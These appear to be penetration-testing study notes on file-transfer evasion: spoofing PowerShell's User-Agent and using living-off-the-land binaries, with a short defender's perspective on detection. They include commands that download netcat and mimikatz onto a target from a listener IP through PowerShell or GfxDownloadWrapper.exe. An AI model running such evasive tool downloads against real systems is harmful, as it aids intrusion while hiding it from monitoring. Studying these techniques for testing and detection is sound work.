# File Transfer Evasion

---

## Changing User-Agent

`Invoke-WebRequest` allows changing the HTTP `User-Agent` header.

Useful when investigating or testing detections based on known User-Agent strings.

> Changing the User-Agent only changes the HTTP header. It does not change the process actually executing the request.

### List Built-in User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
    Select-Object Name,@{
        label="User Agent";
        Expression={
            [Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)
        }
    } |
    Format-List

```

### Built-in User-Agent Options

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent]::InternetExplorer
[Microsoft.PowerShell.Commands.PSUserAgent]::FireFox
[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
[Microsoft.PowerShell.Commands.PSUserAgent]::Opera
[Microsoft.PowerShell.Commands.PSUserAgent]::Safari

```

### Download Using Chrome User-Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest `
    http://10.10.10.32/nc.exe `
    -UserAgent $UserAgent `
    -OutFile "C:\Users\Public\nc.exe"

```

### Check Request on Listener

```bash
nc -lvnp 80

```

Example request:

```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (...) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive

```

### Mental Model

```text
PowerShell
    |
    | Invoke-WebRequest
    |
    | User-Agent: Chrome
    v
HTTP Server

```

The actual client is still PowerShell:

```text
Process:     powershell.exe
User-Agent:  Chrome

```

---

# LOLBAS / GTFOBins

If common tools such as PowerShell or Netcat are blocked or monitored, look for legitimate binaries already installed on the target that provide the required functionality.

```text
Windows → LOLBAS
Linux   → GTFOBins

```

## LOLBIN

**LOLBIN = Living Off The Land Binary**

A legitimate binary already present on the target that can be used for a purpose beyond its normal administrative function.

### Example — GfxDownloadWrapper.exe

```powershell
GfxDownloadWrapper.exe `
    "http://10.10.10.132/mimikatz.exe" `
    "C:\Temp\nc.exe"

```

Concept:

```text
PowerShell / nc
      ↓
Blocked / monitored
      ↓
Find legitimate installed binary
      ↓
Check its available functionality
      ↓
Use suitable LOLBIN

```

---

## Finding Available LOLBINs

First enumerate binaries available on the target:

```cmd
where certutil
where certreq
where bitsadmin
where curl
where mshta
where regsvr32
where rundll32
where msiexec
where cscript
where wscript

```

PowerShell:

```powershell
$bins = @(
    "certutil.exe",
    "certreq.exe",
    "bitsadmin.exe",
    "curl.exe",
    "mshta.exe",
    "regsvr32.exe",
    "rundll32.exe",
    "msiexec.exe",
    "cscript.exe",
    "wscript.exe"
)

foreach ($bin in $bins) {
    $cmd = Get-Command $bin -ErrorAction SilentlyContinue

    if ($cmd) {
        "$($cmd.Name) -> $($cmd.Source)"
    }
}

```

Then check the discovered binary against LOLBAS.

Look for capabilities such as:

```text
Download
Upload
Execute
Proxy
File Operations

```

---

## GTFOBins

For Linux/Unix targets:

```text
GTFOBins
    ↓
Find installed binary
    ↓
Check capabilities
    ↓
File Read / File Write
Download / Upload
Execute

```

Useful categories:

```text
File Read
File Write
File Download
File Upload

```

---

# Detection vs Evasion

### User-Agent

```text
Defender:
Detect unusual User-Agent
        ↓
Attacker:
Change User-Agent
        ↓
Defender:
Correlate with endpoint + network telemetry

```

### LOLBIN

```text
Defender:
PowerShell / nc blocked or monitored
        ↓
Attacker:
Use legitimate installed binary
        ↓
Defender:
Detect unusual use of trusted binary

```

---

# Important Limitations

Changing the User-Agent does **not** make the transfer invisible.

A defender may correlate:

```text
Process
    +
Command Line
    +
Destination IP
    +
URL
    +
HTTP Method
    +
User-Agent
    +
File Created on Disk

```

Example:

```text
powershell.exe
    ↓
Invoke-WebRequest
    ↓
GET /nc.exe
    ↓
User-Agent: Chrome
    ↓
C:\Users\Public\nc.exe created

```

The HTTP request may look like Chrome while endpoint telemetry still identifies PowerShell.

---

# Quick Reference

| TechniquePurpose      |                                   |
| --------------------- | --------------------------------- |
| `-UserAgent`          | Change HTTP User-Agent            |
| `PSUserAgent::Chrome` | Use built-in Chrome User-Agent    |
| `where <binary>`      | Check whether binary is in PATH   |
| `Get-Command`         | Locate executable from PowerShell |
| LOLBAS                | Windows LOLBIN reference          |
| GTFOBins              | Linux/Unix binary reference       |

---

# Key Takeaways

```text
User-Agent
= HTTP header identifying the claimed client

```

```text
-UserAgent
= Invoke-WebRequest parameter for changing User-Agent

```

```text
LOLBIN
= Legitimate binary already present on the target

```

```text
LOLBAS
= Windows LOLBIN reference

```

```text
GTFOBins
= Linux/Unix binary reference

```

### Pentesting Workflow

```text
Need file transfer
        ↓
Normal tool available?
        |
       YES
        ↓
Use normal method

       NO
        ↓
Enumerate available binaries
        ↓
Check LOLBAS / GTFOBins
        ↓
Find required capability
        ↓
Use appropriate installed binary

```

---

## References

- LOLBAS — Windows Living Off The Land Binaries and Scripts
- GTFOBins — Unix/Linux binary reference
